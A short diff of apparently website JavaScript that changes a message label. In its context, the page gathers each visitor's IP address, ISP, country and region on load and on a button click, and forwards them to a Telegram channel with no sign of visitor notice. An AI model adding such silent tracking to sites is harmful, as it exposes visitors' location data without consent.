@@ -6,7 +6,7 @@ window.onload = function() {
             var isp = data.org;
             var country = data.country_name;
             var city = data.region;
-            var message = `CV-SUB-DOMAIN%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
+            var message = `CV SUB DOMAIN%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
             sendTelegramMessage(message);
         })
         .catch(error => {
@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 var isp = data.org;
                 var country = data.country_name;
                 var city = data.region;
-                var message = `CV-SUB-DOMAIN%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AClicked to try NY Encryption`;
+                var message = `CV SUB DOMAIN%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AClicked to try NY Encryption`;
             sendTelegramMessage(message);
         });
     });
